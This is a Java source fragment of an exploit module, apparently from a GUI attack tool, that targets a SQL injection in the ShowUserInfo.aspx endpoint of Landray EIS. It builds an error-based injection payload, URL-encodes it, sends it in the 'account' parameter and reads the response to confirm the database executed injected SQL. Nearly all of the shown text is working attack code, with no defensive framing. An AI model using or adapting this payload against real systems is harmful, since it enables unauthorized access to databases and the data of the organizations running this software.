...
public class landray_eis_ShowUserInfo_sqli implements Exploitlnterface {
    @Override
    ...
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            ...
            String var1 = error_sqli(url,"SUBSTRING((ISNULL(CAST(112*111 AS NVARCHAR(4000)),CHAR(32))),1,1024)");
            if (var1!=null && var1.contains("12432")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ landray_eis_ShowUserInfo_sqli ]");
    ...
    public String error_sqli(String url,String sql){
        try{
            String var1 = "1' AND 3151 IN (SELECT (CHAR(24)+(SELECT "+sql+")+CHAR(24)))-- ETUm";
            String var2 = getAllEncode.getAllUrlEncode(var1,"all");
            url = url + "/third/DingTalk/Demo/ShowUserInfo.aspx?account="+var2;
